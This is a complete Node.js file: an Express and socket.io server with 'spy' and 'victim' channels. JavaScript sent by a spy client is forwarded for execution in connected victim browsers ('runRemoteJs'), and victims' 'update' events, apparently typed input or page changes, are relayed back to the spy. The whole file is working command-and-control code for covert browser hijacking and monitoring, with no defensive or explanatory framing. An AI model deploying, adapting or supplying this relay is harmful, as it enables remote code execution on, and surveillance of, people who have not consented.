var path = require('path'),
    express = require('express'),
    app = express(),
    server = require('http').Server(app),
    io = require('socket.io')(server),
    spy,
    victim;

app.use(express.static(path.join(__dirname, 'public')));

spy = io
    .of('/spy')
    .on('connection', function(socket){
        console.log('a spy connected ');

        socket.on('remoteJs', function(js){
            console.log('spy/remoteJs:', js);
            victim.emit('runRemoteJs', js);
        });

        socket.on('disconnect', function(){
            console.log('spy disconnected');
        });
    });

victim = io
    .of('/victim')
    .on('connection', function(socket){

        console.log('a victim connected');

        socket.on('update', function(change){
            console.log('victim/type:', change);
            spy.emit('update', change);
        });

        socket.on('disconnect', function(){
            console.log('victim disconnected');
        });
    });

server.listen(3000, function(){
    console.log('listening on *:3000');
});